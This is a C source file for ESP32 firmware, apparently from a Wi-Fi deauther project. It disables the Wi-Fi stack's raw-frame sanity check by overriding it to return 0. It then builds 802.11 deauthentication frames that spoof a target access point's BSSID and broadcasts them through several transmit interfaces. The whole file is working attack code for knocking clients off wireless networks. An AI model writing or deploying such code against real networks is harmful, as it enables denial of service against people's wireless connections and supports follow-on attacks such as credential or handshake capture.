/**
 * @file wsl_bypasser.c
 * @author 0x1381 (nullx1381@gmail.com)
 * @date 2021-04-02
 * @copyright Copyright (c) 2021
 * 
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";

/**
 * @brief Deauthentication frame template
 * 
 * Destination address is set to broadcast.
 * Reason code is 0x2 - INVALID_AUTHENTICATION (Previous authentication no longer valid)
 * 
 * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00,                         // Frame Control (deauth)
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (to be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (to be filled)
    0x00, 0x00,                         // Sequence number
    0x02, 0x00                          // Reason code: 2 (Previous authentication no longer valid)
};

/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    return 0;
}

// Try multiple methods to send raw frames
static void try_send_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t err;
    
    // Method 1: Try AP interface with sys_seq
    err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, true);
    if (err == ESP_OK) return;
    
    // Method 2: Try STA interface with sys_seq
    err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, true);
    if (err == ESP_OK) return;
    
    // Method 3: Try AP interface without sys_seq
    err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (err == ESP_OK) return;
    
    // Method 4: Try STA interface without sys_seq
    err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
    if (err != ESP_OK) {
        ESP_LOGD(TAG, "All TX methods failed");
    }
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    try_send_frame(frame_buffer, size);
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record){
    ESP_LOGD(TAG, "Sending deauth frame...");
    
    // Try with broadcast destination
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    
    // Get our MAC addresses
    uint8_t ap_mac[6], sta_mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, ap_mac);
    esp_wifi_get_mac(WIFI_IF_STA, sta_mac);
    
    // Version 1: Spoof as target AP sending broadcast deauth
    memcpy(&deauth_frame[10], ap_record->bssid, 6);  // Source = target AP
    memcpy(&deauth_frame[16], ap_record->bssid, 6);  // BSSID = target AP
    try_send_frame(deauth_frame, sizeof(deauth_frame));
    
    // Version 2: Direct deauth to target AP's BSSID
    memcpy(&deauth_frame[4], ap_record->bssid, 6);   // Dest = target AP
    memcpy(&deauth_frame[10], sta_mac, 6);           // Source = our STA
    memcpy(&deauth_frame[16], ap_record->bssid, 6);  // BSSID = target AP
    try_send_frame(deauth_frame, sizeof(deauth_frame));
}